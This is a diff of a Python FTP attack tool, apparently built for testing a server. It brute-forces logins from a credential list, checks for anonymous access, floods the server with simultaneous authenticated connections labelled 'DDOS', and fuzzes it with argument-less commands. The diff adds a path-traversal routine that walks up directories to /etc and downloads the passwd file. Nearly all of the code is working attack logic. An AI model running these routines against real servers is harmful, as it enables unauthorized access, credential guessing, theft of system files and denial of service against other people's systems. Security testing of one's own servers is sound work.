@@ -1,20 +1,17 @@
 import argparse
-import os
-import re
-import socket
 import threading
-import time
 
 from helper import *
+from utils import check_positive
 
 
 def brute_force_login(host, port, input_list):
     for line in input_list:
         cred = line.split(":")
         try:
-            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(10)
-            connect = s.connect((host,port))
+            connect = s.connect((host, port))
             time.sleep(0.1)
             output = s.recv(1024)
             time.sleep(0.1)
@@ -34,24 +31,25 @@ def brute_force_login(host, port, input_list):
 def anonymous_login(host, port):
     print("Trying to connect to specified {}:{} via anonymous login.".format(host, port))
     try:
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(10)
-        connect = s.connect((host,port))
+        connect = s.connect((host, port))
         time.sleep(0.1)
         output = s.recv(1024)
         time.sleep(0.1)
-        s.send(("USER anonymous\r\n").encode('utf-8'))		
+        s.send(("USER anonymous\r\n").encode('utf-8'))
         output = s.recv(1024)
         time.sleep(0.1)
-        s.send(("PASS password\r\n").encode('utf-8'))	
+        s.send(("PASS password\r\n").encode('utf-8'))
         output = s.recv(1024)
         time.sleep(0.1)
-        print("Anonymous login detected.") if '230 Login successful' in output.decode('utf-8') else print("Unable to connect via anonymous login.")
+        print("Anonymous login detected.") if '230 Login successful' in output.decode('utf-8') else print(
+            "Unable to connect via anonymous login.")
     except socket.error as e:
         print("Caught exception socket.error: {}".format(e))
 
 
-def fuzzFileAccess(host, port):
+def fuzz_file_access(host, port):
     pdf_file = "TestPdf.pdf"
     rtf_file = "TestRtf.rtf"
     directory = "files/"
@@ -73,67 +71,91 @@ def fuzzFileAccess(host, port):
     file_down_thread2.start()
 
 
-def ddos(host , port, username, password, number_connections):
-	socket_list = []
+def fuzz_unauthorized_files(host, port):
+    directory = "files/"  # storing files in this dir
 
-	print("Execute DDOS command with {} simultaneous connections".format(number_connections))
-	print("Open connections to server and authenticate with the passed username and password\n")
-	for index in range(number_connections):
-		try:
-			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-			s.settimeout(10)
-			connect = s.connect((host,port))
-			socket_list.append(s)
-			time.sleep(0.1)
-			output = s.recv(1024)
-			time.sleep(0.1)
-			s.send(("USER {}\r\n".format(username)).encode('utf-8'))		
-			output = s.recv(1024)
-			time.sleep(0.1)
-			s.send(("PASS {}\r\n".format(password)).encode('utf-8'))	
-			output = s.recv(1024)
-			time.sleep(0.1)
-		except socket.error as e:
-			print("Caught exception socket.error: {} at connection {}".format(e, index))
+    # try to download protected file from unix file system
+    command_sock = create_authenticated_connection(host, port)
+
+    # try to find /etc directory
+    print("Finding /etc directory...")
+    if not change_directory(command_sock, "/etc/"):
+        fuzz_dir = "../etc/"
+        parent = "../"
+        while not change_directory(command_sock, fuzz_dir):
+            fuzz_dir = parent + fuzz_dir
+
+    # try to download passwd file
+    set_filemode_and_download_file(host, command_sock, directory, 'passwd')
+
+    print("Send 'QUIT' command")
+    command_sock.send(("QUIT\r\n").encode('utf-8'))
+    output = command_sock.recv(FILE_JUNK)
+    print("Recieved: " + (output.decode('utf-8')))
+    time.sleep(0.5)
+
+    print("Close connection")
+    command_sock.close()
 
 
-def commandsWithoutArguments(host, port):	
-	commands = ['ABOR','ACCT','ALLO','APPE','AUTH','CWD','CDUP','DELE','FEAT','HELP','HOST','LANG','LIST',
-				'MDTM','MKD','MLST','MODE','NLST','NLST -al','NOOP','OPTS','PORT','PROT','PWD','REIN',
-				'REST','RETR','RMD','RNFR','RNTO','SIZE','SITE','SITE CHMOD','SITE CHOWN','SITE EXEC','SITE MSG',
-				'SITE PSWD','SITE ZONE','SITE WHO','SMNT','STAT','STOR','STOU','STRU','SYST','TYPE','USER','XCUP',
-				'XCRC','XCWD','XMKD','XPWD','XRMD']
+def ddos(host, port, username, password, number_connections):
+    socket_list = []
 
-	print("Executing the following commands without arguments:\n{}".format(commands))
+    print("Execute DDOS command with {} simultaneous connections".format(number_connections))
+    print("Open connections to server and authenticate with the passed username and password\n")
+    for index in range(number_connections):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(10)
+            connect = s.connect((host, port))
+            socket_list.append(s)
+            time.sleep(0.1)
+            output = s.recv(1024)
+            time.sleep(0.1)
+            s.send(("USER {}\r\n".format(username)).encode('utf-8'))
+            output = s.recv(1024)
+            time.sleep(0.1)
+            s.send(("PASS {}\r\n".format(password)).encode('utf-8'))
+            output = s.recv(1024)
+            time.sleep(0.1)
+        except socket.error as e:
+            print("Caught exception socket.error: {} at connection {}".format(e, index))
 
-	for command in commands:
-		try:
-			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-			connect = s.connect((host,port))
-			time.sleep(1)
-			s.recv(1024)
-			time.sleep(0.1)
 
-			s.send(("{}\r\n".format(command)).encode('utf-8'))		
-			s.recv(1024)
-			time.sleep(0.1)
+def commandsWithoutArguments(host, port):
+    commands = ['ABOR', 'ACCT', 'ALLO', 'APPE', 'AUTH', 'CWD', 'CDUP', 'DELE', 'FEAT', 'HELP', 'HOST', 'LANG', 'LIST',
+                'MDTM', 'MKD', 'MLST', 'MODE', 'NLST', 'NLST -al', 'NOOP', 'OPTS', 'PORT', 'PROT', 'PWD', 'REIN',
+                'REST', 'RETR', 'RMD', 'RNFR', 'RNTO', 'SIZE', 'SITE', 'SITE CHMOD', 'SITE CHOWN', 'SITE EXEC',
+                'SITE MSG',
+                'SITE PSWD', 'SITE ZONE', 'SITE WHO', 'SMNT', 'STAT', 'STOR', 'STOU', 'STRU', 'SYST', 'TYPE', 'USER',
+                'XCUP',
+                'XCRC', 'XCWD', 'XMKD', 'XPWD', 'XRMD']
 
-			s.send(("PWD\r\n").encode('utf-8'))	
-			s.recv(1024)
-			time.sleep(0.1)
+    print("Executing the following commands without arguments:\n{}".format(commands))
 
-			s.send(("QUIT\r\n").encode('utf-8'))	
-			s.recv(1024)
-			time.sleep(0.1)
-			s.close()
-		except:
-			print("Server crashed while executing '{}'".format(command))
+    for command in commands:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            connect = s.connect((host, port))
+            time.sleep(1)
+            s.recv(1024)
+            time.sleep(0.1)
 
-def check_positive(value):
-    ivalue = int(value)
-    if ivalue <= 0:
-        raise argparse.ArgumentTypeError("%s is an invalid positive int value" % value)
-    return ivalue
+            s.send(("{}\r\n".format(command)).encode('utf-8'))
+            s.recv(1024)
+            time.sleep(0.1)
+
+            s.send(("PWD\r\n").encode('utf-8'))
+            s.recv(1024)
+            time.sleep(0.1)
+
+            s.send(("QUIT\r\n").encode('utf-8'))
+            s.recv(1024)
+            time.sleep(0.1)
+            s.close()
+        except:
+            print("Server crashed while executing '{}'".format(command))
+
 
 def main():
     parser = argparse.ArgumentParser()
@@ -166,32 +188,39 @@ def main():
                         dest='fuzz_file_access',
                         help='Command to fuzz concurrent access to files.'
                         )
+    parser.add_argument('--fuzz-unauthorized-files',
+                        action='store_true',
+                        dest='fuzz_unauthorized_files',
+                        help='Command to fuzz access to normally unauthorized files.'
+                        )
     parser.add_argument('--ddos',
-		                default=argparse.SUPPRESS,
+                        default=argparse.SUPPRESS,
                         dest='ddos',
                         help='Open many simultaneous connections to the FTP Server.',
                         type=check_positive
-    )
+                        )
     parser.add_argument('--commands-no-args',
                         action='store_true',
                         dest='commandsNoArgs',
                         help='Execute many FTP commands without arguments.'
-    )
+                        )
     parser.add_argument('--anonym',
                         action='store_true',
                         dest='anonymous_login',
                         help='Tries to login using anonymous login.'
-    )
+                        )
 
     parser.add_argument('--brute-force',
                         dest='brute_force',
                         help='Takes additional argument with a list containig usernames and passwords containing the following format "username:password".',
                         type=argparse.FileType('r')
-    )
+                        )
     args = parser.parse_args()
 
     if args.fuzz_file_access:
-        fuzzFileAccess(args.host, args.port)
+        fuzz_file_access(args.host, args.port)
+    if args.fuzz_unauthorized_files:
+        fuzz_unauthorized_files(args.host, args.port)
     if args.anonymous_login:
         anonymous_login(args.host, args.port)
     if args.brute_force:
@@ -200,6 +229,7 @@ def main():
         commandsWithoutArguments(args.host, args.port)
     if hasattr(args, 'ddos'):
         ddos(args.host, args.port, args.username, args.password, args.ddos)
+
 
 if __name__ == '__main__':
     main()
